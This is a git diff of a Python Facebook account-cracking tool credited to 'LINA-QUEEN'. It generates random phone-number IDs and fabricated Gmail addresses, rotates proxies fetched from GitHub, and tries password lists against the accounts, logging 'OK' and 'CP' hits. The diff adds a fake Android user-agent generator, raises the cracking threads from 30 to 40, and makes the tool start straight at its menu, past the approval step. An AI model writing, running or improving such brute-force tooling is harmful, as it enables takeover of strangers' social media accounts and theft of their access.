@@ -1,22 +1,16 @@
-
-
-fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
-
-try:
-	import os,requests,json,time,re,random,sys,uuid,string,subprocess
-	from string import *
-	import bs4
-	#import dz
-	from concurrent.futures import ThreadPoolExecutor as tred
-	from bs4 import BeautifulSoup as sop
-	from bs4 import BeautifulSoup
+try: 
+         import os,requests,json,time,re,random,sys,uuid,string,subprocess 
+         from string import * 
+         import bs4
+         from concurrent.futures import ThreadPoolExecutor as tred
+         from bs4 import BeautifulSoup as sop
+         from bs4 import BeautifulSoup
 except ModuleNotFoundError: 
-	print('\n Installing missing modules ...')
-	os.system('pip install requests bs4 futures==2 > /dev/null')
-	os.system('python Random.py')
-	
+         os.system(f'pip install requests futures==2 > /dev/null')    
+         os.system('python Random1.py')
 #print('[•] Join Whatsap Group')
 #os.system('xdg-open https://chat.whatsapp.com/B8pdA0uNxH88NnC38CIgVP')
+fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
 
 try:
 	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
@@ -55,6 +49,21 @@ for xd in range(10000):
 	l='Mobile Safari/537.36'
 	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
 	ugen.append(uaku2)
+for us in range(10000): 
+     aa='Mozilla/5.0 (Linux; Android 13;' 
+     b=random.choice(['7.0','8.1.0','9','10','11','12']) 
+     c=random.choice(['Redmi Note 10 Pro']) 
+     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
+     e=random.randrange(1, 999) 
+     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
+     g='AppleWebKit/537.36 (KHTML, like Gecko)' 
+     h=random.randrange(80,103) 
+     i='0' 
+     j=random.randrange(4200,4900) 
+     k=random.randrange(40,150) 
+     l='Chrome/107.0.0.0 Mobile Safari/537.36' 
+     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}' 
+     ugen.append(uaku2) 
 for agent in range(10000):
 	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
 	b=random.choice(['6','7','8','9','10','11','12','13'])
@@ -148,8 +157,7 @@ device = {
         'fbsv':fbsv,
         'fbca':fbca,
         'fbdm':fbdm}
-        
-        
+
 def main_apv():
 
     imt="QUEEN=="
@@ -219,16 +227,8 @@ def main_apv():
         os.system('am start https://wa.me/+923269916436?text=' + tks)        
         
         
-                
         
         
-        
-        
-        
-        
-        
-        
-
 logo=("""\033[1;97m
       db      d888888b d8b   db  .d8b.  
       88        `88'   888o  88 d8' `8b 
@@ -240,7 +240,7 @@ logo=("""\033[1;97m
 [~] Author   : LINA-QUEEN 
 [~] Facebook : LINA KUMARI
 [~] Tool     : FREE
-[~] Version  : 0.1
+[~] Version  : 1.1
 \033[1;37m----------------------------------------------""")
 def linex():
 	print('\033[1;37m----------------------------------------------')
@@ -329,7 +329,7 @@ def menu():
 					pcp.append('y')
 				else:
 					pcp.append('n')
-				with tred(max_workers=30) as crack_submit:
+				with tred(max_workers=40) as crack_submit:
 					clear()
 					total_ids = str(len(fo))
 					print(' Total account ids : \033[1;32m'+total_ids+f' ')
@@ -396,7 +396,7 @@ def pak():
 		for nmbr in range(limit):
 			nmp = ''.join(random.choice(string.digits) for _ in range(7))
 			user.append(nmp)
-		with tred(max_workers=30) as LINA:	
+		with tred(max_workers=40) as LINA:	
 			clear()
 			tl = str(len(user))
 			print(' Total ids : \033[1;32m'+tl+f' ')
@@ -480,7 +480,7 @@ def gmail():
 				mail = ''.join(random.choice(string.digits) for _ in range(4))
 				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 			fo = open('.re.txt', 'r').read().splitlines()
-		with tred(max_workers=30) as LINA:
+		with tred(max_workers=40) as LINA:
 			total = str(len(fo))
 			clear()
 			print(' Total ids : \033[1;32m'+total+f' ')
@@ -521,7 +521,7 @@ def gmail():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python Random.py')
+		os.system('python Random1.py')
 #b-api method
 #1method
 def api1(ids,names,passlist):
@@ -1673,7 +1673,7 @@ def lina6(ids,passlist):
 	except:
 		pass
 try:
-	main_apv()
+	menu()
 except requests.exceptions.ConnectionError:
 	print('\n No internet connection ...')
 	exit()
